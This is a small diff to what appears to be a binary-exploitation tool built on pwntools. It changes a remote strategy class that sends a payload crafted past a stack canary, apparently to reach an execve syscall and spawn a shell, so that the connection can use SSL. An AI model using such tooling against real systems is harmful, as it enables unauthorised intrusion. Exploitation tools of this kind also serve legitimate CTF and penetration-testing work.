@@ -103,7 +103,7 @@ class CanaryExecveSyscallRemoteStrategy(CanaryStrategy):
 
         payload = self.frame_after_canary(ctx, primitive_payload)
 
-        io = pwn_remote(host, port)
+        io = pwn_remote(host, port, ssl=ctx.ssl)  # v4.1.11
         io.recv()
         io.sendline(payload)
 
